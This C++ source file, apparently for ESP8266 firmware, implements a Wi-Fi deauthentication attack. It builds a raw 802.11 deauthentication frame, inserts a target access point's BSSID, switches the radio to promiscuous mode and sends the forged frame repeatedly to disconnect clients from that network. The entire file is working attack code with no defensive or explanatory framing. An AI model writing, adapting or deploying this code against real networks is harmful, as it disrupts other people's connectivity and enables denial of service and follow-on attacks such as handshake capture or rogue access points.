/*
 * Deauthentication CPP File
 * Author - WireBits
 */

#include "deauth.h"

uint8_t targetBSSID[6];
int targetChannel = 1;
bool deauthRunning = false;

const uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

void startDeauth(int index) {
    WiFi.disconnect();
    wifi_promiscuous_enable(1);
    wifi_set_channel(targetChannel);
    deauthRunning = true;
}

void sendDeauth() {
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);
    memcpy(&packet[10], targetBSSID, 6);
    memcpy(&packet[16], targetBSSID, 6);
    wifi_send_pkt_freedom(packet, 26, 0);
    delay(100);
}

void stopDeauth() {
    deauthRunning = false;
    wifi_promiscuous_enable(0);
    WiFi.mode(WIFI_STA);
}
